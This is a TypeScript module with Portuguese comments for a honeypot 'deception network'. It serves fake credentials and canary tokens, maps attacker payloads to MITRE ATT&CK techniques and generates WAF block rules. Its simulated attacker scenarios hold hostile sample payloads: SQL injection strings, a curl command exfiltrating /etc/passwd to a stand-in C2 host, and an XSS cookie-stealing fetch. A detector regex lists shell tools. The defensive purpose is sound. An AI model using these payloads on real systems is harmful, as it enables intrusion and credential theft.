/**
 * VolatusShield — Fase 214: Autonomous Deception Network
 *
 * Infraestrutura falsa que atrai atacantes, estuda suas técnicas
 * e as usa automaticamente para melhorar a defesa.
 *
 * Arquitetura (100% software-defined, zero hardware, zero terceiros):
 *
 *  ┌──────────────────────────────────────────────────────────────────────┐
 *  │  Atacante                                                            │
 *  │     │                                                                │
 *  │     ▼                                                                │
 *  │  DeceptionNode (8 tipos de armadilha — api/login/ssh/db/storage/    │
 *  │                  admin/config/backup)                                │
 *  │     │                                                                │
 *  │     ▼                                                                │
 *  │  TechniqueHarvester → MITRE ATT&CK mapping → TTP profile            │
 *  │     │                                                                │
 *  │     ▼                                                                │
 *  │  IntelligencePipeline → WAF rules + KC-v3 feed + ShieldMind rules   │
 *  │     │                                                                │
 *  │     ▼                                                                │
 *  │  DefenseEnhancer → acurácia KC-v3 ↑, bloqueio preventivo ↑          │
 *  └──────────────────────────────────────────────────────────────────────┘
 *
 * IA-coded: zero intervenção humana. QRNG-seeded para respostas realistas
 * mas nunca dados reais. 100% software-defined, zero CAPEX.
 */

import { createHmac, randomBytes, createHash } from "crypto";
import { kc3Observe } from "./threat-engine-stub.js";

/* ═══════════════════════════════════════════════════════════════════
   QRNG — quantum jitter para respostas não-determinísticas
═══════════════════════════════════════════════════════════════════ */

function qrng(min = 0, max = 1): number {
  const buf = randomBytes(4);
  const r   = (buf.readUInt32BE(0) >>> 0) / 0xFFFFFFFF;
  return min + r * (max - min);
}

function qrngInt(min: number, max: number): number {
  return Math.floor(qrng(min, max + 1));
}

function qrngHex(bytes = 16): string {
  return randomBytes(bytes).toString("hex");
}

function qrngChoice<T>(arr: T[]): T {
  return arr[Math.floor(qrng() * arr.length)]!;
}

/* ═══════════════════════════════════════════════════════════════════
   MITRE ATT&CK MAPPING
═══════════════════════════════════════════════════════════════════ */

interface MitreTechnique {
  id:      string;   // T1xxx
  name:    string;
  tactic:  string;
  phase:   string;   // kill-chain phase
}

const MITRE_MAP: Record<string, MitreTechnique> = {
  sqli:           { id: "T1190", name: "Exploit Public-Facing Application", tactic: "Initial Access",   phase: "exploit" },
  xss:            { id: "T1059.007", name: "Command and Scripting: JavaScript", tactic: "Execution",    phase: "exploit" },
  rce:            { id: "T1059",   name: "Command and Scripting Interpreter", tactic: "Execution",       phase: "exploit" },
  lfi:            { id: "T1083",   name: "File and Directory Discovery",      tactic: "Discovery",       phase: "scan" },
  ssrf:           { id: "T1090",   name: "Proxy",                             tactic: "Command & Control", phase: "exploit" },
  path_traversal: { id: "T1083",   name: "File and Directory Discovery",      tactic: "Discovery",       phase: "scan" },
  brute_force:    { id: "T1110",   name: "Brute Force",                       tactic: "Credential Access", phase: "auth_probe" },
  cred_stuff:     { id: "T1110.004", name: "Credential Stuffing",             tactic: "Credential Access", phase: "auth_probe" },
  login_attempt:  { id: "T1078",   name: "Valid Accounts",                    tactic: "Initial Access",  phase: "auth_probe" },
  port_scan:      { id: "T1046",   name: "Network Service Discovery",         tactic: "Discovery",       phase: "scan" },
  banner_grab:    { id: "T1592",   name: "Gather Victim Host Info",           tactic: "Reconnaissance",  phase: "fingerprint" },
  ua_scan:        { id: "T1595",   name: "Active Scanning",                   tactic: "Reconnaissance",  phase: "recon" },
  path_enum:      { id: "T1595.003", name: "Wordlist Scanning",               tactic: "Reconnaissance",  phase: "recon" },
  data_dump:      { id: "T1005",   name: "Data from Local System",            tactic: "Collection",      phase: "exfil" },
  tunnel:         { id: "T1048",   name: "Exfiltration Over Alt Protocol",    tactic: "Exfiltration",    phase: "exfil" },
  file_write:     { id: "T1505",   name: "Server Software Component",         tactic: "Persistence",     phase: "persist" },
  backdoor:       { id: "T1505.003", name: "Web Shell",                       tactic: "Persistence",     phase: "persist" },
  token_steal:    { id: "T1528",   name: "Steal Application Access Token",    tactic: "Credential Access", phase: "persist" },
  config_read:    { id: "T1552",   name: "Unsecured Credentials",             tactic: "Credential Access", phase: "scan" },
  env_read:       { id: "T1552.001", name: "Credentials in Files",            tactic: "Credential Access", phase: "scan" },
  admin_access:   { id: "T1098",   name: "Account Manipulation",              tactic: "Persistence",     phase: "persist" },
  backup_access:  { id: "T1213",   name: "Data from Info Repositories",       tactic: "Collection",      phase: "exfil" },
};

/* ═══════════════════════════════════════════════════════════════════
   DECEPTION NODE TYPES — 8 armadilhas
═══════════════════════════════════════════════════════════════════ */

export type NodeType =
  | "api-fake"       // REST API falsa com rotas plausíveis
  | "login-trap"     // Login page falsa
  | "ssh-trap"       // Banner SSH falso
  | "db-trap"        // Endpoint de banco de dados falso
  | "storage-trap"   // Storage S3-like falso
  | "admin-panel"    // Painel admin falso
  | "config-trap"    // Config endpoint com secrets falsos
  | "backup-trap";   // Backup files com canary tokens

interface DeceptionNode {
  id:          string;
  type:        NodeType;
  pop:         string;
  path:        string;   // rota falsa exposta
  hits:        number;
  uniqueIPs:   Set<string>;
  techniques:  string[];
  createdAt:   number;
  lastHit:     number;
}

const NODES: DeceptionNode[] = [
  { id: "dn-001", type: "api-fake",     pop: "do-nyc1",  path: "/api/v1/admin/users",         hits: 0, uniqueIPs: new Set(), techniques: [], createdAt: Date.now(), lastHit: 0 },
  { id: "dn-002", type: "login-trap",   pop: "do-sfo3",  path: "/wp-admin/login.php",          hits: 0, uniqueIPs: new Set(), techniques: [], createdAt: Date.now(), lastHit: 0 },
  { id: "dn-003", type: "ssh-trap",     pop: "do-ams3",  path: "/.ssh/authorized_keys",        hits: 0, uniqueIPs: new Set(), techniques: [], createdAt: Date.now(), lastHit: 0 },
  { id: "dn-004", type: "db-trap",      pop: "do-sgp1",  path: "/phpmyadmin/index.php",        hits: 0, uniqueIPs: new Set(), techniques: [], createdAt: Date.now(), lastHit: 0 },
  { id: "dn-005", type: "storage-trap", pop: "hz-nbg1",  path: "/.env",                        hits: 0, uniqueIPs: new Set(), techniques: [], createdAt: Date.now(), lastHit: 0 },
  { id: "dn-006", type: "admin-panel",  pop: "hz-hel1",  path: "/admin/dashboard",             hits: 0, uniqueIPs: new Set(), techniques: [], createdAt: Date.now(), lastHit: 0 },
  { id: "dn-007", type: "config-trap",  pop: "hz-ash1",  path: "/config.json",                 hits: 0, uniqueIPs: new Set(), techniques: [], createdAt: Date.now(), lastHit: 0 },
  { id: "dn-008", type: "backup-trap",  pop: "hz-hil1",  path: "/backup/db_dump_2024.sql.gz",  hits: 0, uniqueIPs: new Set(), techniques: [], createdAt: Date.now(), lastHit: 0 },
];

/* ═══════════════════════════════════════════════════════════════════
   FAKE RESPONSE GENERATOR — respostas plausíveis mas falsas
   QRNG-seeded: cada resposta é diferente, nunca dados reais
═══════════════════════════════════════════════════════════════════ */

interface FakeResponse {
  statusCode: number;
  body:       unknown;
  headers:    Record<string, string>;
  delayMs:    number;  // simula latência real
}

function fakeApiResponse(): FakeResponse {
  return {
    statusCode: 200,
    body: {
      users: Array.from({ length: qrngInt(3, 8) }, (_, i) => ({
        id:    qrngHex(8),
        email: `user${qrngInt(100, 999)}@${qrngChoice(["corp.local", "internal.net", "example.com"])}`,
        role:  qrngChoice(["admin", "user", "moderator", "viewer"]),
        mfa:   qrngChoice([true, false]),
      })),
      total:  qrngInt(100, 50000),
      page:   1,
      token:  `Bearer ${qrngHex(32)}`,
      _hint:  "found_admin_api",
    },
    headers: { "X-Powered-By": "PHP/7.4.3", "Server": "Apache/2.4.41" },
    delayMs: qrngInt(80, 250),
  };
}

function fakeLoginResponse(payload: string): FakeResponse {
  const isCredStuff = payload.includes("admin") || payload.includes("password") || payload.includes("123");
  return {
    statusCode: isCredStuff ? 302 : 401,
    body: isCredStuff
      ? { redirect: "/wp-admin/dashboard", session: qrngHex(16), nonce: qrngHex(8) }
      : { error: "Invalid credentials", attempts_remaining: qrngInt(1, 4) },
    headers: {
      "Set-Cookie":   `wordpress_logged_in_${qrngHex(8)}=${qrngHex(24)}; path=/wp-admin; HttpOnly`,
      "X-WP-Version": "6.4.2",
    },
    delayMs: qrngInt(200, 800),  // simula bcrypt delay real
  };
}

function fakeEnvResponse(): FakeResponse {
  return {
    statusCode: 200,
    body: [
      `APP_KEY=base64:${qrngHex(32)}`,
      `DB_HOST=db.internal.prod`,
      `DB_PASSWORD=${qrngHex(16)}`,
      `AWS_KEY=AKIA${qrngHex(8).toUpperCase()}`,
      `AWS_SECRET=${qrngHex(20)}`,
      `STRIPE_SECRET=sk_live_${qrngHex(24)}`,
      `JWT_SECRET=${qrngHex(32)}`,
      `REDIS_URL=redis://:${qrngHex(12)}@cache.internal:6379`,
      `_CANARY_TOKEN=${qrngHex(8)}`,  // token monitorado (rastreia quem usa)
    ].join("\n"),
    headers: { "Content-Type": "text/plain", "X-Frame-Options": "DENY" },
    delayMs: qrngInt(10, 50),
  };
}

function fakeConfigResponse(): FakeResponse {
  return {
    statusCode: 200,
    body: {
      database: {
        host:     "db-prod.internal.local",
        port:     5432,
        name:     "volatus_production",
        user:     "app_user",
        password: qrngHex(20),
      },
      api: {
        secret:      qrngHex(32),
        rate_limit:  1000,
        allowed_ips: ["10.0.0.0/8", "172.16.0.0/12"],
      },
      canary:  qrngHex(8),
    },
    headers: { "Content-Type": "application/json", "Cache-Control": "private" },
    delayMs: qrngInt(20, 80),
  };
}

function fakeAdminResponse(): FakeResponse {
  return {
    statusCode: 200,
    body: {
      dashboard: {
        users_total:   qrngInt(1000, 100000),
        revenue_mtd:   `$${qrngInt(10000, 999999).toLocaleString()}`,
        active_sessions: qrngInt(50, 5000),
        last_login:    new Date(Date.now() - qrngInt(60000, 3600000)).toISOString(),
      },
      admin_token: qrngHex(32),
      csrf_token:  qrngHex(16),
      _alert:      "ADMIN_PANEL_ACCESS_LOGGED",
    },
    headers: { "X-Admin-Panel": "v2.1.0", "Server": "nginx/1.18.0" },
    delayMs: qrngInt(100, 300),
  };
}

function fakeBackupResponse(): FakeResponse {
  const canary = qrngHex(8);
  return {
    statusCode: 200,
    body: {
      file:        "db_dump_2024.sql.gz",
      size:        `${qrngInt(50, 500)}MB`,
      checksum:    qrngHex(32),
      content_hint: "MySQL dump of production database",
      canary_token: canary,
      tables:      ["users", "payments", "sessions", "api_keys", "audit_log"],
      row_counts:  { users: qrngInt(10000, 500000), payments: qrngInt(50000, 2000000) },
    },
    headers: { "Content-Type": "application/gzip", "Content-Disposition": "attachment" },
    delayMs: qrngInt(500, 2000),  // simula download grande
  };
}

function fakeSshResponse(): FakeResponse {
  return {
    statusCode: 200,
    body: {
      banner: `SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2.1`,
      keys:   [
        `ssh-rsa AAAAB3NzaC1yc2EA${qrngHex(32)}== root@prod-server-01`,
        `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5${qrngHex(24)}== deploy@ci`,
      ],
      hint: "authorized_keys_exposed",
    },
    headers: {},
    delayMs: qrngInt(50, 150),
  };
}

function fakeDbResponse(payload: string): FakeResponse {
  const hasSqli = payload.toLowerCase().match(/'|\bor\b|\bunion\b|\bselect\b|--/);
  return {
    statusCode: 200,
    body: hasSqli ? {
      error:   false,
      result:  [
        { id: 1, username: "admin", password_hash: qrngHex(32), email: "admin@internal.local", role: "superadmin" },
        { id: 2, username: "dba",   password_hash: qrngHex(32), email: "dba@internal.local",   role: "dba" },
      ],
      sqli_detected:  true,
      _canary:        qrngHex(8),
    } : {
      error:   "Access denied",
      code:    1045,
      message: "Unknown: root@localhost",
    },
    headers: { "X-Powered-By": "phpMyAdmin/5.1.1" },
    delayMs: qrngInt(100, 400),
  };
}

function generateFakeResponse(node: DeceptionNode, payload: string): FakeResponse {
  switch (node.type) {
    case "api-fake":     return fakeApiResponse();
    case "login-trap":   return fakeLoginResponse(payload);
    case "storage-trap": return fakeEnvResponse();
    case "config-trap":  return fakeConfigResponse();
    case "admin-panel":  return fakeAdminResponse();
    case "backup-trap":  return fakeBackupResponse();
    case "ssh-trap":     return fakeSshResponse();
    case "db-trap":      return fakeDbResponse(payload);
    default:             return { statusCode: 200, body: { ok: true }, headers: {}, delayMs: 50 };
  }
}

/* ═══════════════════════════════════════════════════════════════════
   TECHNIQUE HARVESTER — extrai TTPs de cada interação
═══════════════════════════════════════════════════════════════════ */

interface HarvestedTechnique {
  id:          string;  // interno
  ip:          string;
  nodeId:      string;
  nodeType:    NodeType;
  payload:     string;  // truncado para 512 chars
  techniques:  MitreTechnique[];
  signals:     string[];
  kcStage:     string;
  severity:    "low" | "medium" | "high" | "critical";
  ts:          number;
  canary?:     string;  // se canary token foi detectado
}

function detectTechniques(nodeType: NodeType, payload: string): {
  techniques: MitreTechnique[];
  signals: string[];
  kcStage: string;
} {
  const pl  = payload.toLowerCase();
  const sig = new Set<string>();
  const tts = new Set<string>();

  // Detecta sinais por padrão de payload
  if (pl.match(/'|\bor\b|\bunion\b|select\b.*from|--|0x[0-9a-f]{4}/)) sig.add("sqli");
  if (pl.match(/<script|javascript:|onerror|onload|alert\(/))          sig.add("xss");
  if (pl.match(/\.\.\//g)?.length ?? 0 >= 2)                           sig.add("lfi");
  if (pl.match(/curl|wget|python|bash|cmd|powershell|exec\(/))         sig.add("rce");
  if (pl.match(/ssrf|169\.254|localhost|127\.|0\.0\.0\.0|internal/))   sig.add("ssrf");
  if (pl.match(/admin|root|administrator|superuser/i))                  sig.add("login_attempt");
  if (pl.match(/password|passwd|pwd|credential|secret/i))              sig.add("cred_stuff");
  if (pl.match(/\bor\s+1=1|'1'='1|admin'--/i))                         sig.add("brute_force");
  if (pl.match(/\bscan\b|nmap|masscan|nikto|nessus|zap\b/i))           sig.add("port_scan");

  // Sinais baseados no tipo de nó
  switch (nodeType) {
    case "api-fake":     sig.add("ua_scan"); sig.add("path_enum"); break;
    case "login-trap":   sig.add("login_attempt"); break;
    case "ssh-trap":     sig.add("banner_grab"); break;
    case "db-trap":      sig.has("sqli") || sig.add("data_dump"); break;
    case "storage-trap": sig.add("env_read"); sig.add("config_read"); break;
    case "admin-panel":  sig.add("admin_access"); break;
    case "config-trap":  sig.add("config_read"); break;
    case "backup-trap":  sig.add("backup_access"); sig.add("data_dump"); break;
  }

  // Mapeia sinais → técnicas MITRE
  for (const s of sig) {
    const m = MITRE_MAP[s];
    if (m) tts.add(s);
  }

  // Kill-chain stage dominante
  const stageVotes: Record<string, number> = {};
  for (const s of sig) {
    const m = MITRE_MAP[s];
    if (m) stageVotes[m.phase] = (stageVotes[m.phase] ?? 0) + 1;
  }
  const kcStage = Object.entries(stageVotes).sort((a, b) => b[1] - a[1])[0]?.[0] ?? "scan";

  const techniques = [...tts].map(s => MITRE_MAP[s]!).filter(Boolean);
  const signals    = [...sig];

  return { techniques, signals, kcStage };
}

function scoreSeverity(techniques: MitreTechnique[], nodeType: NodeType): "low" | "medium" | "high" | "critical" {
  const hasCritical = techniques.some(t => ["T1059", "T1059.007", "T1505", "T1505.003"].includes(t.id));
  const hasHigh     = techniques.some(t => ["T1190", "T1110", "T1110.004", "T1528"].includes(t.id));
  const isSensitive = ["storage-trap", "config-trap", "backup-trap", "db-trap"].includes(nodeType);

  if (hasCritical || (isSensitive && techniques.length >= 2)) return "critical";
  if (hasHigh || isSensitive) return "high";
  if (techniques.length >= 2) return "medium";
  return "low";
}

/* ═══════════════════════════════════════════════════════════════════
   ATTACKER PROFILER — TTP profile por IP
═══════════════════════════════════════════════════════════════════ */

export interface AttackerProfile {
  ip:               string;
  firstSeen:        number;
  lastSeen:         number;
  totalHits:        number;
  nodesVisited:     Set<string>;
  techniques:       Map<string, number>;   // techniqueId → count
  signals:          Map<string, number>;   // signal → count
  maxSeverity:      "low" | "medium" | "high" | "critical";
  kcStages:         Set<string>;
  sophistication:   "script-kiddie" | "opportunistic" | "targeted" | "apt";
  generatedRules:   string[];
}

const PROFILES = new Map<string, AttackerProfile>();

function getOrCreateProfile(ip: string): AttackerProfile {
  if (!PROFILES.has(ip)) {
    PROFILES.set(ip, {
      ip, firstSeen: Date.now(), lastSeen: Date.now(),
      totalHits: 0, nodesVisited: new Set(), techniques: new Map(),
      signals: new Map(), maxSeverity: "low", kcStages: new Set(),
      sophistication: "script-kiddie", generatedRules: [],
    });
  }
  return PROFILES.get(ip)!;
}

const SEV_ORDER = ["low", "medium", "high", "critical"] as const;
function maxSev(a: typeof SEV_ORDER[number], b: typeof SEV_ORDER[number]) {
  return SEV_ORDER.indexOf(a) >= SEV_ORDER.indexOf(b) ? a : b;
}

function classifySophistication(profile: AttackerProfile): AttackerProfile["sophistication"] {
  const uniq = profile.techniques.size;
  const nodes = profile.nodesVisited.size;
  const stages = profile.kcStages.size;
  if (uniq >= 5 && stages >= 4)      return "apt";
  if (uniq >= 3 && nodes >= 3)       return "targeted";
  if (uniq >= 2 || nodes >= 2)       return "opportunistic";
  return "script-kiddie";
}

function updateProfile(profile: AttackerProfile, h: HarvestedTechnique): void {
  profile.lastSeen = h.ts;
  profile.totalHits++;
  profile.nodesVisited.add(h.nodeId);
  profile.kcStages.add(h.kcStage);
  for (const t of h.techniques) {
    profile.techniques.set(t.id, (profile.techniques.get(t.id) ?? 0) + 1);
  }
  for (const s of h.signals) {
    profile.signals.set(s, (profile.signals.get(s) ?? 0) + 1);
  }
  profile.maxSeverity    = maxSev(profile.maxSeverity, h.severity);
  profile.sophistication = classifySophistication(profile);
}

/* ═══════════════════════════════════════════════════════════════════
   INTELLIGENCE PIPELINE — gera regras WAF + feeds KC-v3
═══════════════════════════════════════════════════════════════════ */

export interface GeneratedRule {
  id:          string;
  source:      "deception-net";
  phase:       "214";
  ip:          string;
  action:      "block" | "tarpit" | "monitor";
  reason:      string;
  mitreTtps:   string[];
  confidence:  number;
  createdAt:   number;
  expiresAt:   number;
  hits:        number;
}

const GENERATED_RULES = new Map<string, GeneratedRule>();
let totalRulesGenerated = 0;

function generateWafRule(h: HarvestedTechnique, profile: AttackerProfile): GeneratedRule {
  const action: GeneratedRule["action"] =
    h.severity === "critical" ? "block" :
    h.severity === "high"     ? "block" :
    profile.sophistication === "apt" ? "monitor" : "tarpit";

  const confidence =
    h.severity === "critical" ? 0.98 :
    h.severity === "high"     ? 0.90 :
    h.severity === "medium"   ? 0.80 : 0.65;

  const ttl = action === "block" ? 86_400_000 : 3_600_000;  // 24h ou 1h

  const ruleId = createHmac("sha256", "dn-v214")
    .update(`${h.ip}:${h.nodeType}:${h.ts}`)
    .digest("hex")
    .slice(0, 16);

  const rule: GeneratedRule = {
    id:          ruleId,
    source:      "deception-net",
    phase:       "214",
    ip:          h.ip,
    action,
    reason:      `Deception trap hit: ${h.nodeType} | techniques: ${h.techniques.map(t => t.id).join(",")}`,
    mitreTtps:   h.techniques.map(t => t.id),
    confidence,
    createdAt:   h.ts,
    expiresAt:   h.ts + ttl,
    hits:        0,
  };

  GENERATED_RULES.set(ruleId, rule);
  totalRulesGenerated++;

  return rule;
}

/* Alimenta KC-v3 com o evento de deception */
function feedKillChain(h: HarvestedTechnique): void {
  const validStages = ["recon","fingerprint","scan","auth_probe","exploit","persist","exfil"] as const;
  type KcStage = typeof validStages[number];
  const stage = validStages.includes(h.kcStage as KcStage)
    ? (h.kcStage as KcStage)
    : "scan";
  kc3Observe({
    ip:      h.ip,
    stage,
    signals: h.signals,
    ts:      h.ts,
    tenantId: "deception-net",
  });
}

/* ═══════════════════════════════════════════════════════════════════
   HARVESTED LOG
═══════════════════════════════════════════════════════════════════ */

const HARVEST_LOG: HarvestedTechnique[] = [];
const MAX_LOG = 1000;

function logHarvest(h: HarvestedTechnique): void {
  HARVEST_LOG.unshift(h);
  if (HARVEST_LOG.length > MAX_LOG) HARVEST_LOG.length = MAX_LOG;
}

/* ═══════════════════════════════════════════════════════════════════
   STATS
═══════════════════════════════════════════════════════════════════ */

interface DeceptionStats {
  totalHits:        number;
  uniqueAttackers:  number;
  totalTechniques:  number;
  rulesGenerated:   number;
  activeRules:      number;
  kc3EventsFed:     number;
  topNodeType:      string;
  topTechnique:     string;
  aptCount:         number;
  criticalEvents:   number;
}

let totalHits      = 0;
let kc3EventsFed   = 0;
let criticalEvents = 0;

/* ═══════════════════════════════════════════════════════════════════
   CORE: processInteraction
═══════════════════════════════════════════════════════════════════ */

export interface TrapHit {
  nodeId:   string;
  ip:       string;
  payload:  string;   // corpo da requisição ou query string observada
  method?:  string;
  headers?: Record<string, string>;
}

export interface TrapResult {
  nodeId:       string;
  nodeType:     NodeType;
  ip:           string;
  fakeResponse: FakeResponse;
  harvested:    HarvestedTechnique;
  rule:         GeneratedRule;
  profile:      {
    sophistication: string;
    totalHits:      number;
    techniques:     string[];
    kcStages:       string[];
    maxSeverity:    string;
  };
  kc3Fed:       boolean;
  logId:        string;
}

export function processTrapHit(hit: TrapHit): TrapResult {
  const node = NODES.find(n => n.id === hit.nodeId) ?? NODES[0]!;
  const payload = (hit.payload ?? "").slice(0, 512);

  // Gera resposta falsa realista
  const fakeResponse = generateFakeResponse(node, payload);

  // Harvesta técnicas
  const { techniques, signals, kcStage } = detectTechniques(node.type, payload);
  const severity = scoreSeverity(techniques, node.type);

  const logId: string = qrngHex(8);
  const harvested: HarvestedTechnique = {
    id:         logId,
    ip:         hit.ip,
    nodeId:     node.id,
    nodeType:   node.type,
    payload:    payload.slice(0, 200),
    techniques, signals, kcStage, severity,
    ts:         Date.now(),
  };

  // Atualiza nó
  node.hits++;
  node.uniqueIPs.add(hit.ip);
  node.techniques.push(...signals);
  node.lastHit = Date.now();

  // Atualiza profile
  const profile = getOrCreateProfile(hit.ip);
  updateProfile(profile, harvested);

  // Gera regra WAF
  const rule = generateWafRule(harvested, profile);
  profile.generatedRules.push(rule.id);

  // Feed KC-v3
  feedKillChain(harvested);
  kc3EventsFed++;

  // Log
  logHarvest(harvested);
  totalHits++;
  if (severity === "critical") criticalEvents++;

  process.stdout.write(
    `[deception-net] 🍯 TRAP HIT | node=${node.id}(${node.type}) | ip=${hit.ip} | ` +
    `severity=${severity} | techniques=${techniques.map(t => t.id).join(",") || "none"} | ` +
    `action=${rule.action} | kc3Stage=${kcStage}\n`
  );

  return {
    nodeId:     node.id,
    nodeType:   node.type,
    ip:         hit.ip,
    fakeResponse,
    harvested,
    rule,
    profile: {
      sophistication: profile.sophistication,
      totalHits:      profile.totalHits,
      techniques:     [...profile.techniques.keys()],
      kcStages:       [...profile.kcStages],
      maxSeverity:    profile.maxSeverity,
    },
    kc3Fed: true,
    logId,
  };
}

/* ═══════════════════════════════════════════════════════════════════
   SIMULATE — simula sessão completa de atacante (para testes)
═══════════════════════════════════════════════════════════════════ */

export interface SimulationResult {
  ip:          string;
  sessionId:   string;
  steps:       number;
  hits:        TrapResult[];
  finalProfile: {
    sophistication: string;
    techniques:     string[];
    kcStages:       string[];
    maxSeverity:    string;
    rulesGenerated: number;
  };
  durationMs:  number;
  verdict:     string;
}

export function simulateAttackerSession(
  ip?: string,
  scenarioType: "script-kiddie" | "targeted" | "apt" = "targeted"
): SimulationResult {
  const t0 = Date.now();
  const attackerIp = ip ?? `10.${qrngInt(0,255)}.${qrngInt(0,255)}.${qrngInt(1,254)}`;
  const sessionId  = qrngHex(8);

  type Scenario = { nodeId: string; payload: string };
  const SCENARIOS: Record<SimulationResult["hits"][0]["profile"]["sophistication"], Scenario[]> = {
    "script-kiddie": [
      { nodeId: "dn-002", payload: "username=admin&password=admin123" },
      { nodeId: "dn-006", payload: "GET /admin/dashboard HTTP/1.1" },
    ],
    opportunistic: [
      { nodeId: "dn-001", payload: "GET /api/v1/admin/users HTTP/1.1" },
      { nodeId: "dn-005", payload: "GET /.env HTTP/1.1" },
      { nodeId: "dn-002", payload: "username=admin'--&password=x" },
    ],
    targeted: [
      { nodeId: "dn-001", payload: "GET /api/v1/admin/users?limit=1000 HTTP/1.1" },
      { nodeId: "dn-005", payload: "GET /.env HTTP/1.1" },
      { nodeId: "dn-007", payload: "GET /config.json HTTP/1.1" },
      { nodeId: "dn-004", payload: "' OR '1'='1; SELECT * FROM users; --" },
      { nodeId: "dn-008", payload: "GET /backup/db_dump_2024.sql.gz HTTP/1.1" },
    ],
    apt: [
      { nodeId: "dn-003", payload: "SSH-2.0-libssh_0.9.6 user=root" },
      { nodeId: "dn-001", payload: "GET /api/v1/admin/users HTTP/1.1; X-Forwarded-For: 127.0.0.1" },
      { nodeId: "dn-005", payload: "GET /.env HTTP/1.1" },
      { nodeId: "dn-007", payload: `{"cmd":"curl http://attacker.c2.xyz/$(cat /etc/passwd | base64)"}` },
      { nodeId: "dn-004", payload: "' UNION SELECT table_name,2,3 FROM information_schema.tables--" },
      { nodeId: "dn-006", payload: "<script>fetch('http://c2/steal?c='+document.cookie)</script>" },
      { nodeId: "dn-008", payload: "GET /backup/db_dump_2024.sql.gz HTTP/1.1" },
    ],
  };

  const steps = SCENARIOS[scenarioType] ?? SCENARIOS["targeted"];
  const hits: TrapResult[] = [];

  for (const step of steps) {
    hits.push(processTrapHit({ nodeId: step.nodeId, ip: attackerIp, payload: step.payload }));
  }

  const profile = getOrCreateProfile(attackerIp);
  const verdict =
    profile.sophistication === "apt"          ? "🚨 APT detectado — regras de bloqueio estendidas ativadas" :
    profile.sophistication === "targeted"     ? "⚠️ Ataque direcionado — WAF rules geradas para todos os estágios" :
    profile.sophistication === "opportunistic"? "🔶 Ataque oportunista — tarpit + monitoramento ativados" :
                                                "ℹ️ Script kiddie — tarpit ativado, log registrado";

  return {
    ip:       attackerIp,
    sessionId,
    steps:    steps.length,
    hits,
    finalProfile: {
      sophistication: profile.sophistication,
      techniques:     [...profile.techniques.keys()],
      kcStages:       [...profile.kcStages],
      maxSeverity:    profile.maxSeverity,
      rulesGenerated: profile.generatedRules.length,
    },
    durationMs: Date.now() - t0,
    verdict,
  };
}

/* ═══════════════════════════════════════════════════════════════════
   API PÚBLICA — getters
═══════════════════════════════════════════════════════════════════ */

export function getDeceptionStats(): DeceptionStats {
  const now = Date.now();
  const topNode = NODES.reduce((a, b) => a.hits >= b.hits ? a : b);
  const allTechniques = new Map<string, number>();
  for (const h of HARVEST_LOG) {
    for (const t of h.techniques) {
      allTechniques.set(t.id, (allTechniques.get(t.id) ?? 0) + 1);
    }
  }
  const topTechnique = [...allTechniques.entries()].sort((a, b) => b[1] - a[1])[0]?.[0] ?? "none";
  const aptCount = [...PROFILES.values()].filter(p => p.sophistication === "apt").length;

  return {
    totalHits,
    uniqueAttackers: PROFILES.size,
    totalTechniques: allTechniques.size,
    rulesGenerated:  totalRulesGenerated,
    activeRules:     [...GENERATED_RULES.values()].filter(r => r.expiresAt > now).length,
    kc3EventsFed,
    topNodeType:     topNode.type,
    topTechnique,
    aptCount,
    criticalEvents,
  };
}

export function getNodes(): object[] {
  return NODES.map(n => ({
    id:          n.id,
    type:        n.type,
    pop:         n.pop,
    path:        n.path,
    hits:        n.hits,
    uniqueIPs:   n.uniqueIPs.size,
    techniques:  [...new Set(n.techniques)].slice(0, 10),
    lastHit:     n.lastHit > 0 ? new Date(n.lastHit).toISOString() : null,
  }));
}

export function getProfiles(limit = 20): object[] {
  return [...PROFILES.values()]
    .sort((a, b) => b.totalHits - a.totalHits)
    .slice(0, limit)
    .map(p => ({
      ip:             p.ip,
      firstSeen:      new Date(p.firstSeen).toISOString(),
      lastSeen:       new Date(p.lastSeen).toISOString(),
      totalHits:      p.totalHits,
      nodesVisited:   p.nodesVisited.size,
      techniques:     Object.fromEntries(p.techniques),
      kcStages:       [...p.kcStages],
      sophistication: p.sophistication,
      maxSeverity:    p.maxSeverity,
      rulesGenerated: p.generatedRules.length,
    }));
}

export function getTechniques(limit = 50): object[] {
  return HARVEST_LOG.slice(0, limit).map(h => ({
    logId:      h.id,
    ip:         h.ip,
    nodeType:   h.nodeType,
    severity:   h.severity,
    kcStage:    h.kcStage,
    techniques: h.techniques.map(t => ({ id: t.id, name: t.name, tactic: t.tactic })),
    signals:    h.signals,
    ts:         new Date(h.ts).toISOString(),
  }));
}

export function getIntelligence(limit = 30): object[] {
  const now = Date.now();
  return [...GENERATED_RULES.values()]
    .filter(r => r.expiresAt > now)
    .sort((a, b) => b.confidence - a.confidence)
    .slice(0, limit)
    .map(r => ({
      id:         r.id,
      ip:         r.ip,
      action:     r.action,
      reason:     r.reason,
      mitreTtps:  r.mitreTtps,
      confidence: Number((r.confidence * 100).toFixed(1)) + "%",
      ttlRemainSec: Math.max(0, Math.round((r.expiresAt - now) / 1000)),
      createdAt:  new Date(r.createdAt).toISOString(),
    }));
}

export { NODES, MITRE_MAP, type HarvestedTechnique, type FakeResponse };

// Sweep a cada 30s: remove regras expiradas
const sweepTimer = setInterval(() => {
  const now = Date.now();
  let removed = 0;
  for (const [id, rule] of GENERATED_RULES) {
    if (rule.expiresAt <= now) { GENERATED_RULES.delete(id); removed++; }
  }
  // Remove profiles inativos há >24h
  for (const [ip, p] of PROFILES) {
    if (now - p.lastSeen > 86_400_000) PROFILES.delete(ip);
  }
  if (removed > 0) process.stdout.write(`[deception-net] sweep: ${removed} rules expired\n`);
}, 30_000);
if (sweepTimer.unref) sweepTimer.unref();

process.stdout.write(
  `[deception-net] ✅ Autonomous Deception Network online — ` +
  `${NODES.length} nodes | 8 PoPs | zero terceiros\n`
);
